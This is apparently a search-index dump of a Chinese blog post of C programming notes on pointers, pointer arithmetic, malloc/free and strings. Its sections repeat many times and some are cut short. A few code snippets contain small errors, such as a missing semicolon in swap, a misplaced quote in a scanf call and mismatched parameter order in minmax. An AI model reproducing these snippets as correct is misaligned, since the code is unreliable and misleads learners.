\u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#通过指针计算数组元素个数和数组元素的储存单元数"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针是const"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#const数组"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#保护数组值"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#92指针运算"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针计算"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#p"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针比较"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#0地址"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针的类型"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针的类型转换"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#用指针来做什么"},{"categories":["Programing"],"content":"\r动态内存的分配\rmalloc就是向系统申请内存 #include\u003cstdlib.h\u003e void* malloc(size_t size) ; 向malloc申请的空间的大小是以字节为单位的 返回的结果是void*，需要类型转换为自己需要的类型 (int*)malloc(n*sizeof(int)) 如果没空间了如果申请失败则返回0，或者叫做NULL #include \u003cstdio.h\u003e #include\u003cstdlib.h\u003e int main(void) { void *p; int cnt = 0; while ((p = malloc(100 * 1024 * 1024))) { cnt++; } printf(\"分配了%d00MB的空间\", cnt); return 0; } 查看系统最多能给分配多少内存(不要轻易尝试，容易卡死) free()与malloc配套的函数，把申请的空间还给系统 只能还申请阿里的空间的首地址 常见问题申请了没free—-\u003e长时间运行内存逐渐下降(内存垃圾堆积) ","date":"2023-11-17","objectID":"/c_language_notes/:9:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#动态内存的分配"},{"categories":["Programing"],"content":"\r动态内存的分配\rmalloc就是向系统申请内存 #include void* malloc(size_t size) ; 向malloc申请的空间的大小是以字节为单位的 返回的结果是void*，需要类型转换为自己需要的类型 (int*)malloc(n*sizeof(int)) 如果没空间了如果申请失败则返回0，或者叫做NULL #include #include int main(void) { void *p; int cnt = 0; while ((p = malloc(100 * 1024 * 1024))) { cnt++; } printf(\"分配了%d00MB的空间\", cnt); return 0; } 查看系统最多能给分配多少内存(不要轻易尝试，容易卡死) free()与malloc配套的函数，把申请的空间还给系统 只能还申请阿里的空间的首地址 常见问题申请了没free—-\u003e长时间运行内存逐渐下降(内存垃圾堆积) ","date":"2023-11-17","objectID":"/c_language_notes/:9:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#malloc"},{"categories":["Programing"],"content":"\r动态内存的分配\rmalloc就是向系统申请内存 #include void* malloc(size_t size) ; 向malloc申请的空间的大小是以字节为单位的 返回的结果是void*，需要类型转换为自己需要的类型 (int*)malloc(n*sizeof(int)) 如果没空间了如果申请失败则返回0，或者叫做NULL #include #include int main(void) { void *p; int cnt = 0; while ((p = malloc(100 * 1024 * 1024))) { cnt++; } printf(\"分配了%d00MB的空间\", cnt); return 0; } 查看系统最多能给分配多少内存(不要轻易尝试，容易卡死) free()与malloc配套的函数，把申请的空间还给系统 只能还申请阿里的空间的首地址 常见问题申请了没free—-\u003e长时间运行内存逐渐下降(内存垃圾堆积) ","date":"2023-11-17","objectID":"/c_language_notes/:9:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#如果没空间了"},{"categories":["Programing"],"content":"\r动态内存的分配\rmalloc就是向系统申请内存 #include void* malloc(size_t size) ; 向malloc申请的空间的大小是以字节为单位的 返回的结果是void*，需要类型转换为自己需要的类型 (int*)malloc(n*sizeof(int)) 如果没空间了如果申请失败则返回0，或者叫做NULL #include #include int main(void) { void *p; int cnt = 0; while ((p = malloc(100 * 1024 * 1024))) { cnt++; } printf(\"分配了%d00MB的空间\", cnt); return 0; } 查看系统最多能给分配多少内存(不要轻易尝试，容易卡死) free()与malloc配套的函数，把申请的空间还给系统 只能还申请阿里的空间的首地址 常见问题申请了没free—-\u003e长时间运行内存逐渐下降(内存垃圾堆积) ","date":"2023-11-17","objectID":"/c_language_notes/:9:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#free"},{"categories":["Programing"],"content":"\r动态内存的分配\rmalloc就是向系统申请内存 #include void* malloc(size_t size) ; 向malloc申请的空间的大小是以字节为单位的 返回的结果是void*，需要类型转换为自己需要的类型 (int*)malloc(n*sizeof(int)) 如果没空间了如果申请失败则返回0，或者叫做NULL #include #include int main(void) { void *p; int cnt = 0; while ((p = malloc(100 * 1024 * 1024))) { cnt++; } printf(\"分配了%d00MB的空间\", cnt); return 0; } 查看系统最多能给分配多少内存(不要轻易尝试，容易卡死) free()与malloc配套的函数，把申请的空间还给系统 只能还申请阿里的空间的首地址 常见问题申请了没free—-\u003e长时间运行内存逐渐下降(内存垃圾堆积) ","date":"2023-11-17","objectID":"/c_language_notes/:9:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#常见问题"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#101字符串"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 ","date":"2023-11-17","objectID":"/c_language_notes/:10:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符数组"},{"categories":["Programing"],"content":"\r10.1字符串\r字符数组\r以整数0结尾的一串字符 0或’\\0’是一样的，但是和'0’不同 0标志字符串的结束，但它不是字符串的一部分| 计算字符串长度的时候不包含这个0 字符串以数组的形式存在，以数组或指针的形式访问 更多的是以指针的形式 string.h里有很多处理字符串的函数 字符串变量 char *str = \"Hello\" ; char word[] = \"Hello\" ; char line[10] = \"Hello\" ; 字符串常量 “Hello” “Hello\"会被编译器变成一个字符数组放在某处，这个数组的长度是6，结尾还有表示结束的0 两个相邻的字符串常量会被自动连接起来 char* s = \"hello,world.\"; s是一个指针，初始化为指向一个字符串常量 这个常量所在的地方只能读不能写，所以实际上s是const char* s，但是由于历史的原因，编译器接受不带const的写法 试图对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组：char s[] = \"Hello,world!\"; 字符串 C语言的字符串是以字符数组的形态存在的 不能用运算符对字符串做运算 通过数组的方式可以遍历字符串 唯一特殊的地方是字符串字面量可以用来初始化字符数组 标准库提供了一些列字符串函数 构造字符串，用指针还是数组数组：这个字符串在这里，作文本地变量空间自动被收回 指针：这个字符串不知道在哪里(处理参数，动态分配空间) 也就是说， 如果要构造字符串—-\u003e数组 如果要处理字符串—-\u003e指针 char*是字符串？不对，字符串可以表达为char*形式，但char*不一定是字符串 本意是指向字符串的指针，可能指向的是字符的数组(就像int*一样) 只有它所指的字符串数组有结尾的0，才能说它所指的是字符串 字符串输入输出 char string[8]; scanf(\"%s,string\"); printf(\"%s\",string); scanf读入一个单词(到空格、tab或回车为止) scanf是不安全的，其不限制读入的长度 安全的输入 char string[8]; scanf(\"%7s\",string); ​ 在%和s之间的数字表示最多允许读入的字符的数量，这个数字应该比数组的大小小一 常见错误 char *string; scanf(\"%s\",string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每一运行都出错 空字符串 char buffer[100]=\"\"; 这是一个空的字符串，buffer[0] == '\\0' char buffer[] = \"\"; 这个数组的长度只有1 字符串数组 char **a a是一个指针，指向另一个指针 char a[][] 程序参数 int main(int argc,char const *argv[]) argv[0]是命令本身 当使用Unix的符号链接时，反应符号链接的名字 